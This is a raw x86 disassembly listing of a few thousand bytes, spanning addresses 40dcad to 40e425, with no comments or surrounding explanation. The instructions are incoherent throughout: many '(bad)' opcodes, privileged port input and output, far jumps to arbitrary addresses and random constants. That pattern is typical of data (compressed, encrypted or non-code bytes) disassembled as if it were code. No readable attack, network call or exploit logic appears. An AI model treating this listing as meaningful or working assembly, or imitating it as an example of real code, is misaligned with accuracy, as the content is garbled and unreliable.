  40dcad:	and    esp,esp
  40dcaf:	out    0xf7,al
  40dcb1:	jae    0x40dcff
  40dcb3:	jl     0x40dcc8
  40dcb5:	je     0x40dcdd
  40dcb7:	test   eax,0xdb2d3212
  40dcbc:	mov    eax,0xedb0322
  40dcc1:	rcl    cl,0x6
  40dcc4:	out    dx,eax
  40dcc5:	rol    WORD PTR [ebp-0x3fa695c4],1
  40dccc:	cmp    al,0xa2
  40dcce:	lods   al,BYTE PTR ds:[esi]
  40dccf:	cdq    
  40dcd0:	mov    BYTE PTR [edi-0x65d81fde],al
  40dcd6:	and    ebx,DWORD PTR [edx-0x1]
  40dcd9:	adc    BYTE PTR [esi+0x59],al
  40dcdc:	in     eax,0x23
  40dcde:	dec    edi
  40dcdf:	leave  
  40dce0:	xchg   eax,edx
  40dce2:	add    BYTE PTR [ecx-0x35],bl
  40dce5:	jmp    0x40dd1e
  40dce7:	ins    DWORD PTR es:[edi],dx
  40dce8:	adc    dl,dh
  40dcea:	cs xchg esi,eax
  40dcec:	(bad)  
  40dced:	(bad)  
  40dcef:	test   DWORD PTR [eax-0x467761c5],ecx
  40dcf5:	and    eax,0xd5390e0d
  40dcfa:	xchg   ebp,eax
  40dcfb:	bound  ebp,QWORD PTR [edx]
  40dcfd:	push   edi
  40dcfe:	pop    ss
  40dcff:	cli    
  40dd00:	and    al,0xcb
  40dd02:	dec    edx
  40dd03:	mov    ds:0xfba0eb8b,eax
  40dd08:	(bad)  
  40dd09:	mov    esp,0xc3bf572a
  40dd0e:	add    al,0x11
  40dd10:	ret    
  40dd11:	jle    0x40dd6c
  40dd13:	jbe    0x40dd3a
  40dd15:	in     al,dx
  40dd16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd17:	inc    esi
  40dd18:	lods   eax,DWORD PTR ds:[esi]
  40dd19:	aam    0x42
  40dd1b:	dec    ebp
  40dd1c:	push   edi
  40dd1d:	test   eax,0x9865e385
  40dd22:	addr16 hlt 
  40dd24:	gs (bad) 
  40dd26:	adc    eax,0xfa3669e8
  40dd2b:	rcl    BYTE PTR [ebx],0x1b
  40dd2e:	jg     0x40dd40
  40dd30:	dec    esi
  40dd31:	outs   dx,DWORD PTR ds:[esi]
  40dd32:	cdq    
  40dd33:	sub    ebp,edi
  40dd35:	iret   
  40dd36:	xchg   esp,eax
  40dd37:	mov    al,ds:0x9896d6a3
  40dd3c:	leave  
  40dd3d:	mov    edi,0xd6b2f1bb
  40dd42:	dec    ebx
  40dd43:	cmc    
  40dd44:	fs iret 
  40dd46:	jmp    0x869075a
  40dd4b:	out    0x8f,eax
  40dd4d:	scas   eax,DWORD PTR es:[edi]
  40dd4e:	xchg   edi,eax
  40dd4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd50:	fdivr  DWORD PTR [ecx]
  40dd52:	mov    dh,0x4d
  40dd54:	add    DWORD PTR [ecx+eax*1+0x70],edi
  40dd58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd59:	enter  0x5d,0x3b
  40dd5d:	xor    DWORD PTR [edi-0xc],eax
  40dd60:	push   eax
  40dd61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd62:	aas    
  40dd63:	pop    ecx
  40dd64:	jmp    0x4e54:0xbb01bbf3
  40dd6b:	mov    al,0x85
  40dd6d:	call   0xf0eaf5b6
  40dd72:	enter  0x824,0x5d
  40dd76:	mov    BYTE PTR [ecx],dh
  40dd78:	icebp  
  40dd79:	add    ebp,DWORD PTR [eax+0x28]
  40dd7c:	push   cs
  40dd7d:	test   dl,cl
  40dd7f:	xor    al,0x21
  40dd81:	sar    edi,0xc7
  40dd84:	add    eax,0xb636ab1d
  40dd89:	inc    esi
  40dd8a:	stos   DWORD PTR es:[edi],eax
  40dd8b:	dec    esi
  40dd8c:	sar    dl,cl
  40dd8e:	pop    esi
  40dd8f:	push   0x99a14925
  40dd94:	ins    BYTE PTR es:[edi],dx
  40dd95:	dec    ebp
  40dd96:	(bad)  
  40dd97:	clc    
  40dd98:	iret   
  40dd99:	mov    cl,0xba
  40dd9b:	xchg   edi,eax
  40dd9c:	gs dec eax
  40dd9e:	add    BYTE PTR [esi-0x5e],bl
  40dda1:	cmp    al,0xb0
  40dda3:	mov    ecx,DWORD PTR [ebp+edi*8-0x33]
  40dda7:	add    BYTE PTR [ebx],bh
  40dda9:	test   al,0x3c
  40ddab:	inc    ecx
  40ddac:	test   DWORD PTR [ebp-0x6a521b4a],esp
  40ddb2:	ret    
  40ddb3:	pusha  
  40ddb4:	into   
  40ddb5:	jno    0x40dd7d
  40ddb7:	cmc    
  40ddb8:	ins    DWORD PTR es:[edi],dx
  40ddb9:	sub    al,BYTE PTR [ebp+0x37]
  40ddbc:	sub    ah,dh
  40ddbe:	add    eax,0xb0ad661e
  40ddc3:	daa    
  40ddc4:	enter  0xfd8d,0x71
  40ddc8:	jbe    0x40ddcf
  40ddca:	jmp    0x40ddbc
  40ddcc:	into   
  40ddcd:	pushf  
  40ddce:	add    eax,0x4fa85b7a
  40ddd3:	fadd   DWORD PTR [ebx-0x24]
  40ddd6:	js     0x40dd90
  40ddd8:	leave  
  40ddd9:	stos   BYTE PTR es:[edi],al
  40ddda:	inc    esi
  40dddb:	outs   dx,DWORD PTR ds:[esi]
  40dddc:	and    DWORD PTR [ecx+0x4e84fbad],eax
  40dde2:	jno    0x40ddbd
  40dde4:	cmp    DWORD PTR [ecx+0x7d8589f1],ebp
  40ddea:	xor    BYTE PTR [edi+0x51],bh
  40dded:	hlt    
  40ddee:	call   0x87245f88
  40ddf3:	aas    
  40ddf4:	add    ebp,esp
  40ddf6:	jae    0x40dddc
  40ddf8:	xlat   BYTE PTR ds:[ebx]
  40ddf9:	lock imul esi,DWORD PTR [ecx-0x27],0x501db8f3
  40de01:	pop    edi
  40de02:	sub    BYTE PTR [edi-0xc],ah
  40de05:	jnp    0x40de4c
  40de07:	add    cl,al
  40de09:	jmp    0x4bc:0x6c5bd738
  40de10:	inc    ecx
  40de11:	ret    
  40de12:	add    eax,0x67c2fc39
  40de17:	and    al,0x1a
  40de19:	mov    al,ds:0x1999a4a2
  40de1e:	sub    ebx,eax
  40de20:	les    ebx,FWORD PTR [edi]
  40de22:	inc    esp
  40de23:	loopne 0x40de79
  40de25:	mov    esi,0xbf86007d
  40de2a:	loope  0x40de9a
  40de2c:	push   ebp
  40de2d:	xor    al,0x75
  40de2f:	add    dl,dl
  40de31:	aas    
  40de32:	inc    esp
  40de33:	lock mov dl,ah
  40de36:	in     eax,dx
  40de37:	cli    
  40de38:	or     eax,0xe9c1eaa7
  40de3d:	sbb    edi,DWORD PTR ds:0xad0cd0ab
  40de43:	pop    esi
  40de44:	inc    ecx
  40de45:	into   
  40de46:	pop    esp
  40de47:	test   BYTE PTR [ebx+ebx*4-0xf],ah
  40de4b:	dec    eax
  40de4c:	sbb    al,dl
  40de4e:	mov    bl,0xfd
  40de50:	xchg   edi,eax
  40de51:	sbb    eax,0xf96d9c1c
  40de56:	(bad)  
  40de57:	cmp    al,0x79
  40de59:	mov    WORD PTR fs:[ecx+0x6e],ss
  40de5d:	mov    al,ds:0x7b3a76dc
  40de62:	mov    eax,ds:0xe134c621
  40de67:	dec    edx
  40de68:	xchg   esi,eax
  40de69:	inc    edi
  40de6a:	pop    eax
  40de6b:	pop    esi
  40de6c:	push   ss
  40de6d:	arpl   WORD PTR [esi],sp
  40de6f:	daa    
  40de70:	adc    ch,bh
  40de72:	lds    ebp,FWORD PTR [edi]
  40de74:	pop    edi
  40de75:	mov    esp,0x2b86d7d0
  40de7a:	out    0xc7,eax
  40de7c:	stos   BYTE PTR es:[edi],al
  40de7d:	ins    DWORD PTR es:[edi],dx
  40de7e:	sbb    dl,al
  40de80:	dec    edi
  40de81:	inc    ecx
  40de82:	dec    edi
  40de83:	sbb    edx,DWORD PTR [ecx-0xf]
  40de86:	sti    
  40de87:	pop    ebp
  40de88:	push   0x59643ae8
  40de8d:	cmp    DWORD PTR [esi+0x37ddf144],ecx
  40de93:	popa   
  40de94:	xlat   BYTE PTR ds:[ebx]
  40de95:	jle    0x40defd
  40de97:	adc    al,BYTE PTR [eax+0x6744744c]
  40de9d:	sbb    BYTE PTR [ebx],dh
  40de9f:	jns    0x40de51
  40dea1:	lds    ebp,FWORD PTR fs:[ebx-0x1acef86e]
  40dea8:	mov    WORD PTR [ecx],ds
  40deaa:	adc    dl,dh
  40deac:	(bad)  
  40deae:	pop    ds
  40deaf:	inc    esi
  40deb0:	and    ah,cl
  40deb2:	(bad)  
  40deb3:	aam    0x74
  40deb5:	xor    eax,0x85cfa7f
  40deba:	stos   BYTE PTR es:[edi],al
  40debb:	mov    bl,0xb2
  40debd:	out    dx,al
  40debe:	xchg   BYTE PTR [ecx+0x52],dh
  40dec1:	xchg   ebp,eax
  40dec2:	dec    edx
  40dec3:	loop   0x40df3c
  40dec5:	icebp  
  40dec6:	ja     0x40df46
  40dec8:	paddq  mm1,QWORD PTR [eax+ebp*4-0x55fb8667]
  40ded0:	ins    BYTE PTR es:[edi],dx
  40ded1:	movzx  ecx,WORD PTR [esi+0x7e]
  40ded5:	lea    ebp,[ecx-0x2e]
  40ded8:	xor    dl,BYTE PTR ds:0x54c0e99f
  40dede:	dec    ebx
  40dedf:	sbb    al,0xf0
  40dee1:	pop    esi
  40dee2:	dec    ebx
  40dee3:	rcl    BYTE PTR [esp+ebp*2+0x382b50d8],cl
  40deea:	sbb    edx,DWORD PTR [ecx+0x5297bcc3]
  40def0:	(bad)  
  40def1:	fld    TBYTE PTR [edx-0x60b230cc]
  40def7:	clc    
  40def8:	nop
  40def9:	mov    bl,BYTE PTR [esi]
  40defb:	xchg   ecx,eax
  40defc:	(bad)  
  40defd:	jbe    0x40deb9
  40deff:	mov    edi,0x1563e0be
  40df04:	nop
  40df05:	fst    DWORD PTR [ebp-0x44]
  40df09:	add    al,0xd0
  40df0b:	mov    WORD PTR [ecx-0x7b],ss
  40df0e:	pop    ebp
  40df0f:	inc    esp
  40df10:	jg     0x40df19
  40df12:	sub    al,0x21
  40df14:	push   ebp
  40df15:	loope  0x40df18
  40df17:	and    edi,DWORD PTR [ebp-0x21539ab3]
  40df1d:	dec    ebp
  40df1e:	dec    edi
  40df1f:	xor    BYTE PTR [edi-0x28],ah
  40df22:	mov    ds:0xd08a246,al
  40df27:	jo     0x40df5c
  40df29:	adc    al,0x5d
  40df2b:	pushf  
  40df2c:	repnz rcl esp,0x2c
  40df30:	sub    ebx,edi
  40df32:	aaa    
  40df33:	rcl    BYTE PTR [ecx-0x58],cl
  40df36:	pop    esi
  40df37:	hlt    
  40df38:	cmc    
  40df39:	(bad)  
  40df3a:	sub    eax,0x9df41c4d
  40df3f:	pop    es
  40df40:	sub    DWORD PTR [esi+eax*4-0x439a9d90],ecx
  40df47:	adc    eax,0xbc3babe2
  40df4c:	add    BYTE PTR [esi],ah
  40df4e:	dec    edx
  40df4f:	mov    dl,0xac
  40df51:	retf   0x6655
  40df54:	pop    ebx
  40df55:	xor    al,bl
  40df57:	pop    ecx
  40df58:	adc    al,0x93
  40df5a:	out    dx,al
  40df5b:	mov    dh,0x28
  40df5d:	sbb    eax,0xd7437702
  40df62:	shr    ebp,0x61
  40df65:	addr16 pop ecx
  40df67:	int3   
  40df68:	fst    QWORD PTR [ebx]
  40df6a:	(bad)  
  40df6b:	pushf  
  40df6c:	lods   eax,DWORD PTR ds:[esi]
  40df6d:	mov    esi,0xe47ec14
  40df72:	dec    eax
  40df73:	popa   
  40df74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df75:	cmc    
  40df76:	gs loop 0x40df3b
  40df79:	adc    DWORD PTR [eax],esp
  40df7b:	sub    BYTE PTR [ebx],0x5f
  40df7e:	sbb    eax,DWORD PTR [esi]
  40df80:	les    eax,FWORD PTR ss:[edx+0x36]
  40df84:	sbb    al,0x4b
  40df86:	aam    0x7b
  40df88:	lea    esp,[ecx+edx*1-0x658ab641]
  40df8f:	push   edx
  40df90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df91:	sbb    esp,DWORD PTR [ebx-0x6d]
  40df94:	pop    ss
  40df95:	xchg   eax,esi
  40df97:	mov    ebx,0x41f02db7
  40df9c:	in     eax,dx
  40df9d:	mov    esp,ebx
  40df9f:	popf   
  40dfa0:	cli    
  40dfa1:	push   0x4c68a464
  40dfa6:	sub    DWORD PTR [ecx],ebp
  40dfa8:	mov    ebx,0x86a43145
  40dfad:	pusha  
  40dfae:	js     0x40df6d
  40dfb0:	cmp    edi,edx
  40dfb2:	xchg   esp,eax
  40dfb3:	mov    cl,0x51
  40dfb5:	xchg   ebx,eax
  40dfb6:	and    DWORD PTR [eax+0x54],0xc918c1da
  40dfbd:	cmp    DWORD PTR [edx-0x32e17828],edx
  40dfc3:	adc    BYTE PTR [esi],0xfa
  40dfc6:	mov    cl,0x66
  40dfc8:	data16 (bad) [eax-0x55]
  40dfcc:	dec    edi
  40dfcd:	pop    ebp
  40dfce:	(bad)  
  40dfcf:	pop    ebp
  40dfd0:	cmp    al,0x5a
  40dfd2:	js     0x40e03d
  40dfd4:	jae    0x40dff4
  40dfd6:	xlat   BYTE PTR ds:[ebx]
  40dfd7:	cmp    DWORD PTR [eax+ecx*8+0x1ab5f054],edi
  40dfde:	sbb    al,0xae
  40dfe0:	pop    ebp
  40dfe1:	loope  0x40dfac
  40dfe3:	xchg   esi,eax
  40dfe4:	jno    0x40e060
  40dfe6:	mov    cl,0x72
  40dfe8:	mov    esp,0x7c1cd7d9
  40dfed:	bsr    ebx,DWORD PTR [ecx+0x3f]
  40dff1:	jge    0x40e027
  40dff3:	pop    ss
  40dff4:	out    dx,eax
  40dff5:	xchg   ebp,eax
  40dff6:	push   0x6de5879c
  40dffb:	pop    ss
  40dffc:	in     al,0x59
  40dffe:	in     al,dx
  40dfff:	div    BYTE PTR [esi-0x495ad321]
  40e005:	ja     0x40df92
  40e007:	loopne 0x40e061
  40e009:	sub    ebx,DWORD PTR [edi]
  40e00b:	bound  ebp,QWORD PTR [eax]
  40e00d:	fidiv  WORD PTR [eax]
  40e00f:	imul   eax,DWORD PTR [edi+0x7b],0x3890951b
  40e016:	out    0x29,al
  40e018:	mov    cl,0x7b
  40e01a:	dec    edx
  40e01b:	clc    
  40e01c:	add    eax,eax
  40e01e:	cmp    ch,cl
  40e020:	outs   dx,BYTE PTR ds:[esi]
  40e021:	jbe    0x40e06e
  40e023:	jmp    FWORD PTR [edx+0x35689b6e]
  40e029:	ins    DWORD PTR es:[edi],dx
  40e02a:	test   eax,0xbe956adf
  40e02f:	inc    edi
  40e030:	out    0x1f,al
  40e032:	inc    esp
  40e033:	mov    bl,0x8d
  40e035:	adc    dl,BYTE PTR [edi+0x4]
  40e038:	or     DWORD PTR [esi+0x591a3828],ebx
  40e03e:	mov    eax,0x672904fa
  40e043:	pop    esp
  40e044:	fwait
  40e045:	cmc    
  40e046:	jb     0x40dfcc
  40e048:	push   0x14c0df6d
  40e04d:	rcl    BYTE PTR [esi-0x7c1c9815],0x49
  40e054:	sub    eax,0x9dff9810
  40e059:	push   ss
  40e05a:	xchg   edx,eax
  40e05b:	xchg   edi,eax
  40e05c:	ins    DWORD PTR es:[edi],dx
  40e05d:	sahf   
  40e05e:	fsubr  QWORD PTR [ecx]
  40e060:	out    dx,eax
  40e061:	retf   0x235f
  40e064:	add    ebx,ecx
  40e066:	loope  0x40e032
  40e068:	in     eax,0xa4
  40e06a:	push   ecx
  40e06b:	adc    edx,DWORD PTR [eax-0x39]
  40e06e:	shr    BYTE PTR [edx],1
  40e070:	xadd   BYTE PTR ds:0x8bb777bb,ch
  40e077:	sbb    BYTE PTR [esi-0x6f],bl
  40e07a:	sbb    ebx,DWORD PTR [ecx-0x54]
  40e07d:	cwde   
  40e07e:	fs loope 0x40e0fc
  40e081:	push   ecx
  40e082:	ret    0x6250
  40e085:	and    dl,BYTE PTR [eax-0x955d022]
  40e08b:	fbld   TBYTE PTR ds:0x5d53510
  40e091:	leave  
  40e092:	hlt    
  40e093:	das    
  40e094:	cmp    al,0x81
  40e096:	(bad)  
  40e097:	cld    
  40e098:	leave  
  40e099:	repz out dx,al
  40e09b:	pop    ds
  40e09c:	fsub   DWORD PTR [ebx+0x735a2510]
  40e0a2:	push   edx
  40e0a3:	push   edi
  40e0a4:	jbe    0x40e048
  40e0a6:	cdq    
  40e0a7:	jge    0x40e0a5
  40e0a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0aa:	nop
  40e0ab:	out    dx,al
  40e0ac:	mov    esp,0x878ad36b
  40e0b1:	dec    eax
  40e0b2:	jb     0x40e06f
  40e0b4:	mov    esi,DWORD PTR [bx]
  40e0b7:	ins    BYTE PTR es:[edi],dx
  40e0b8:	shl    DWORD PTR [ecx+0x298b8621],0xa8
  40e0bf:	aam    0xbf
  40e0c1:	ffree  st(2)
  40e0c3:	jno    0x40e137
  40e0c5:	jne    0x40e09b
  40e0c7:	adc    al,0xba
  40e0c9:	rcl    DWORD PTR [esi-0x70],0x3d
  40e0cd:	imul   ebx,ebx,0x47
  40e0d0:	mov    ah,0x45
  40e0d2:	and    eax,0x9026be6e
  40e0d7:	sbb    DWORD PTR [ecx+0x21],0xb3ef34aa
  40e0de:	retf   
  40e0df:	dec    edi
  40e0e0:	and    eax,0xd914a2e9
  40e0e5:	imul   esp,DWORD PTR [ebx-0xa],0x7a
  40e0e9:	lds    eax,FWORD PTR [ebp-0x2e]
  40e0ec:	in     eax,dx
  40e0ed:	push   eax
  40e0ee:	mov    esp,0xf3418dc9
  40e0f3:	call   0x36c11c5b
  40e0f8:	ror    ch,0x20
  40e0fb:	or     eax,0xc69cefa1
  40e100:	mov    dh,0xb4
  40e102:	retf   
  40e103:	stc    
  40e104:	lods   eax,DWORD PTR ds:[esi]
  40e105:	pop    eax
  40e106:	mov    al,ds:0x43919692
  40e10b:	aaa    
  40e10c:	inc    edx
  40e10d:	les    ebx,FWORD PTR [esi+0x24]
  40e110:	xchg   DWORD PTR [ebx-0x6f],eax
  40e113:	inc    ebp
  40e114:	rol    BYTE PTR [esp+eiz*2+0x229c6400],0x35
  40e11c:	mov    al,ds:0xe11c8ce8
  40e121:	mov    DWORD PTR [edx],0xf524004d
  40e127:	dec    esi
  40e128:	les    ebx,FWORD PTR [ecx-0x11]
  40e12b:	push   ss
  40e12c:	lds    eax,FWORD PTR [esi+0x44]
  40e12f:	inc    esp
  40e130:	xor    al,dl
  40e132:	fmul   DWORD PTR [esi+0x78a08849]
  40e138:	cmp    DWORD PTR [ecx+eiz*8-0xd],edx
  40e13c:	repnz (bad) 
  40e13e:	push   ds
  40e13f:	mov    ah,0xb2
  40e141:	and    bl,BYTE PTR [esi+eax*8]
  40e144:	cmp    BYTE PTR [ebp+0x3b],0xc8
  40e148:	add    BYTE PTR [esi],bl
  40e14a:	scas   al,BYTE PTR es:[edi]
  40e14b:	popa   
  40e14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e14d:	cli    
  40e14e:	pop    es
  40e14f:	and    al,0x4e
  40e151:	pop    edi
  40e152:	mov    esi,0xc879f9b
  40e157:	pop    ebp
  40e158:	dec    esi
  40e159:	repz and DWORD PTR cs:[esi-0x6],0xc92838ff
  40e162:	popa   
  40e163:	out    0xd3,eax
  40e165:	fiadd  WORD PTR [edx]
  40e167:	sbb    BYTE PTR [ebx-0x14],dl
  40e16a:	neg    cl
  40e16c:	test   BYTE PTR [esi+ebp*1-0x4a],cl
  40e170:	cs ret 
  40e172:	mov    bl,0x23
  40e174:	add    DWORD PTR [esi+0x2b],ecx
  40e177:	xor    bh,BYTE PTR [edi+0x59c9fc36]
  40e17d:	pop    ebp
  40e17e:	retf   0x8e94
  40e181:	outs   dx,DWORD PTR ds:[esi]
  40e182:	jle    0x40e19c
  40e184:	inc    eax
  40e185:	cmp    DWORD PTR [esi+0x33],0x52
  40e189:	push   ebp
  40e18a:	imul   ebx,eax,0xaa4ee2d4
  40e190:	add    esp,esp
  40e192:	out    dx,eax
  40e193:	inc    ebx
  40e194:	xchg   ch,bh
  40e196:	mov    al,ds:0x981a8dad
  40e19b:	push   0xbc2ef396
  40e1a0:	lock js 0x40e17c
  40e1a3:	sar    cl,1
  40e1a5:	das    
  40e1a6:	rol    BYTE PTR [edx],1
  40e1a8:	pusha  
  40e1a9:	or     ah,BYTE PTR [esi]
  40e1ab:	out    0x1f,al
  40e1ad:	mov    al,ds:0x516061c8
  40e1b2:	or     eax,0xdc6b1dfa
  40e1b7:	(bad)  
  40e1b8:	fdivrp st(5),st
  40e1ba:	pop    esp
  40e1bb:	sub    eax,0x9da0cd0a
  40e1c0:	fwait
  40e1c1:	out    dx,al
  40e1c2:	retf   0x9af6
  40e1c5:	ja     0x40e1bc
  40e1c7:	pop    esp
  40e1c8:	fld    QWORD PTR [eax-0x45]
  40e1cb:	jmp    0xadfd:0x30a6f4db
  40e1d2:	repnz lods eax,DWORD PTR ds:[esi]
  40e1d4:	leave  
  40e1d5:	dec    edx
  40e1d6:	pop    ebx
  40e1d7:	in     eax,0x6
  40e1d9:	sbb    eax,ebp
  40e1db:	dec    ebx
  40e1dc:	mov    ds:0x604ef07b,al
  40e1e1:	clc    
  40e1e2:	gs int3 
  40e1e4:	gs cli 
  40e1e6:	add    dh,BYTE PTR [ebp+0x6ab24889]
  40e1ec:	add    DWORD PTR [edx],ebx
  40e1ee:	xchg   esp,eax
  40e1ef:	mov    ds:0xddcfb03f,eax
  40e1f4:	xchg   edi,eax
  40e1f5:	cmp    cl,BYTE PTR [ebx+eax*2]
  40e1f8:	adc    cl,dl
  40e1fa:	sbb    BYTE PTR es:[esi],bh
  40e1fd:	or     eax,0xdd6e5322
  40e202:	fmul   QWORD PTR [edi+0x6c]
  40e205:	adc    BYTE PTR [esi+0x1e079fb4],ah
  40e20b:	add    al,0x62
  40e20d:	nop
  40e20e:	or     DWORD PTR [ecx+0x43],0xffffffb5
  40e212:	fs jb  0x40e248
  40e215:	cmp    eax,0x8db4d6ed
  40e21a:	xor    eax,0x17829e46
  40e21f:	mov    eax,ds:0x68ccbd8d
  40e224:	cmp    al,0x70
  40e226:	retf   
  40e227:	inc    ebp
  40e228:	popa   
  40e229:	dec    esi
  40e22a:	jno    0x40e1dd
  40e22c:	mov    bl,0x6c
  40e22e:	loopne 0x40e290
  40e230:	aaa    
  40e231:	rcr    esi,1
  40e233:	inc    ecx
  40e234:	ins    DWORD PTR es:[edi],dx
  40e235:	lock mov dl,0xc3
  40e238:	dec    esp
  40e239:	not    BYTE PTR [ecx]
  40e23b:	fist   DWORD PTR [ebp+ecx*1+0x1b9f7daf]
  40e242:	enter  0xeff,0x3
  40e246:	add    bl,0x6b
  40e249:	jge    0x40e1e9
  40e24b:	es loop 0x40e1f1
  40e24e:	push   0x74
  40e250:	scas   eax,DWORD PTR es:[edi]
  40e251:	fld    st(6)
  40e253:	dec    ebx
  40e254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e255:	or     bh,BYTE PTR [ebx]
  40e257:	sub    ch,bl
  40e259:	dec    edx
  40e25a:	sub    al,0xe8
  40e25c:	sub    ah,dl
  40e25e:	ret    
  40e25f:	cld    
  40e260:	adc    DWORD PTR [edi],0xc
  40e263:	stc    
  40e264:	cmc    
  40e265:	and    esi,esp
  40e267:	mov    ecx,0xa29183dd
  40e26c:	cld    
  40e26d:	mov    al,BYTE PTR [ecx+0x74]
  40e270:	fst    DWORD PTR [edi+0x68874c21]
  40e276:	lds    eax,FWORD PTR [edx-0x6b]
  40e279:	outs   dx,DWORD PTR ds:[esi]
  40e27a:	mov    gs,WORD PTR [ebx-0x79]
  40e27d:	push   ebp
  40e27e:	lahf   
  40e27f:	or     BYTE PTR [ebp+0x5d0252b2],bh
  40e285:	out    dx,al
  40e286:	stos   DWORD PTR es:[edi],eax
  40e287:	imul   edi,DWORD PTR [ecx-0x2],0x550f6d9
  40e28e:	enter  0x23d5,0x58
  40e292:	retf   0xc49f
  40e295:	jp     0x40e29a
  40e297:	mov    ebp,DWORD PTR [ebp-0x5ca121f5]
  40e29d:	cmp    eax,esp
  40e29f:	sbb    dh,bh
  40e2a1:	pusha  
  40e2a2:	stc    
  40e2a3:	mov    dl,0x56
  40e2a5:	cmp    al,0x68
  40e2a7:	mov    ebx,0xbed10598
  40e2ac:	pop    es
  40e2ad:	dec    ebp
  40e2ae:	jecxz  0x40e2d2
  40e2b0:	or     esp,ecx
  40e2b2:	lea    esp,[ecx]
  40e2b4:	iret   
  40e2b5:	je     0x40e2b0
  40e2b7:	dec    esi
  40e2b8:	sbb    cl,BYTE PTR [edi+0x7f41cfca]
  40e2be:	dec    ebx
  40e2bf:	pop    esi
  40e2c0:	mov    esi,0xace3ad03
  40e2c5:	fimul  WORD PTR [ebx]
  40e2c7:	xlat   BYTE PTR ds:[ebx]
  40e2c8:	pop    ebx
  40e2c9:	mov    al,ds:0xcf6f8881
  40e2ce:	inc    edi
  40e2cf:	cmp    bh,dl
  40e2d1:	pop    esi
  40e2d2:	jae    0x40e268
  40e2d4:	(bad)  
  40e2d5:	retf   0x7ec7
  40e2d8:	ins    BYTE PTR es:[edi],dx
  40e2d9:	adc    eax,0x3be6ccf9
  40e2de:	imul   edx,DWORD PTR [esi-0x2b],0x7e
  40e2e2:	leave  
  40e2e3:	xor    BYTE PTR [edi-0x1b80f104],ah
  40e2e9:	xor    esi,DWORD PTR [ebp+0x918f751]
  40e2ef:	or     eax,0xf838dd54
  40e2f4:	aam    0xf9
  40e2f6:	fld    TBYTE PTR [edx+0x58]
  40e2f9:	mov    eax,0x7bea7f71
  40e2fe:	aas    
  40e2ff:	and    eax,DWORD PTR [edi-0x58]
  40e302:	pop    ss
  40e303:	in     eax,0x9e
  40e305:	sbb    al,0x2b
  40e307:	mov    bh,0x7c
  40e309:	mov    al,0x61
  40e30b:	inc    ecx
  40e30c:	cmp    BYTE PTR [edx+0xd4de0ec],cl
  40e312:	cmc    
  40e313:	shr    BYTE PTR [ebx-0x74],cl
  40e316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e317:	or     eax,0xf1733e60
  40e31c:	sbb    BYTE PTR [edi],al
  40e31e:	enter  0xc57d,0x9e
  40e322:	and    edx,edx
  40e324:	sbb    cx,WORD PTR [edi+ebx*2]
  40e328:	sub    esi,ebx
  40e32a:	aas    
  40e32b:	cmp    ebp,DWORD PTR [edi]
  40e32d:	daa    
  40e32e:	loop   0x40e353
  40e330:	ds push esi
  40e332:	mov    ds:0x2284710a,eax
  40e337:	jmp    0xe669a488
  40e33c:	rcl    BYTE PTR es:[ecx+0x75e86761],1
  40e343:	xchg   edx,eax
  40e344:	sub    DWORD PTR [edx+0x7f0f6c],0x26
  40e34b:	test   BYTE PTR [ebp+0x62537d3f],ch
  40e351:	bound  eax,QWORD PTR [edx+edi*4-0x7b701ffa]
  40e358:	sub    ecx,edx
  40e35a:	or     ah,BYTE PTR [ecx-0x14]
  40e35d:	add    DWORD PTR [ebp-0x5fca5ec1],0x7
  40e364:	dec    ebx
  40e365:	mov    WORD PTR [esi+0x7b9e5fe1],fs
  40e36b:	jne    0x40e373
  40e36d:	cmc    
  40e36e:	xor    eax,0xd005a1e3
  40e373:	sbb    al,dl
  40e375:	pop    edx
  40e376:	pop    es
  40e377:	call   DWORD PTR [esi+0x22c28d9f]
  40e37d:	addr16 jnp 0x40e3a4
  40e380:	mov    esp,0x45cbdd69
  40e385:	addr16 or ah,al
  40e388:	mov    ebp,0x50f8b7b4
  40e38d:	jg     0x40e3e8
  40e38f:	mov    eax,fs
  40e391:	mov    ds:0x7a8ae7df,eax
  40e396:	mov    ecx,0x48191915
  40e39b:	sbb    BYTE PTR [edi+0x3c129f86],dh
  40e3a1:	ror    BYTE PTR [eax+0x6a156da0],1
  40e3a7:	mov    edi,0xfbd53fc
  40e3ac:	outs   dx,BYTE PTR ds:[esi]
  40e3ad:	int    0xaa
  40e3af:	cld    
  40e3b0:	sub    BYTE PTR [ebp+0x582ea5b7],cl
  40e3b6:	out    0x89,eax
  40e3b8:	sbb    bl,bl
  40e3ba:	arpl   cx,bp
  40e3bc:	mov    cl,0x93
  40e3be:	bound  ebx,QWORD PTR [edi]
  40e3c0:	cmp    dh,BYTE PTR [ebp+0x62]
  40e3c3:	sub    bl,BYTE PTR [ebx+0x1c93dd17]
  40e3c9:	sahf   
  40e3ca:	mov    fs:0xb6f73c40,al
  40e3d0:	sub    eax,DWORD PTR [edi-0x7b5ac9c7]
  40e3d6:	out    dx,al
  40e3d7:	add    al,0x62
  40e3d9:	add    esi,edx
  40e3db:	cmp    dl,BYTE PTR [edx]
  40e3dd:	mov    al,0x33
  40e3df:	call   0x210a1659
  40e3e4:	sbb    ch,BYTE PTR [esi+eax*8-0x6]
  40e3e8:	jl     0x40e3de
  40e3ea:	or     DWORD PTR [ebp-0xddef627],0x67
  40e3f1:	mov    DWORD PTR [ebp+0x13],0x6d50e718
  40e3f8:	jmp    0xcbe7858e
  40e3fd:	test   ecx,esi
  40e3ff:	mov    ch,0xf0
  40e401:	mov    eax,ds:0x2a3d865b
  40e406:	mov    eax,0x6929ab43
  40e40b:	jne    0x40e42b
  40e40d:	adc    ecx,DWORD PTR [edi]
  40e40f:	add    al,0xa8
  40e411:	mov    cl,0xda
  40e413:	and    eax,DWORD PTR [ebx+0x75e4798d]
  40e419:	cld    
  40e41a:	mov    cl,0xc8
  40e41c:	mov    esp,0x5dfd2abf
  40e421:	ja     0x40e3a6
  40e423:	in     eax,dx
  40e424:	aas    
  40e425:	fstp   DWORD PTR [ebp+edx*1-0x62b7d540]
